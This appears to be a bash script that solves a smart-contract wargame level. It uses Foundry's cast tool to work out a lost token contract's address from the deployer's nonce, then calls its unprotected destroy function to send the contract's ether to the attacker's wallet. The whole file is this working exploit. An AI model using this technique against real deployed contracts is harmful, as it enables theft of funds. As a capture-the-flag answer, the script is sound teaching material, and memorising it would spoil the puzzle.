#!/usr/bin/env bash
set -e

CONTRACT="$1"

[ "$CONTRACT" == "" ] && echo "A contract address must be specified as the first argument" >&2 && exit 1
[ "$ETH_RPC_URL" == "" ] && echo "ETH_RPC_URL not set" >&2 && exit 1
[ "$CHAIN" == "" ] && echo "CHAIN not set" >&2 && exit 1

if [ "$PRIVATE_KEY" == "" ]
then
	echo "Enter private key"
	read -s "PRIVATE_KEY"
fi
PRIVATE_KEY=$(echo $PRIVATE_KEY | sed 's/^0x//')

echo "Executing exploit"

CONTRACT_NONCE=$(cast nonce ${CONTRACT})
let "NONCE = ${CONTRACT_NONCE} - 1"
TOKEN_ADDRESS=$(cast compute-address ${CONTRACT} --nonce ${NONCE} | awk '{print $3}')
echo "Token address: ${TOKEN_ADDRESS}"

ATTACKER_ADDRESS=$(cast wallet address --private-key ${PRIVATE_KEY} | tr [:upper:] [:lower:])

cast send \
	--private-key ${PRIVATE_KEY} \
	${TOKEN_ADDRESS} \
	$(cast calldata "destroy(address)" ${ATTACKER_ADDRESS})

BALANCE=$(cast balance ${TOKEN_ADDRESS} | cast to-dec)

if [ ${BALANCE} -eq 0 ]
then
	echo "Level completed, submit instance"
else
	echo "ERROR: Solution failed"
fi
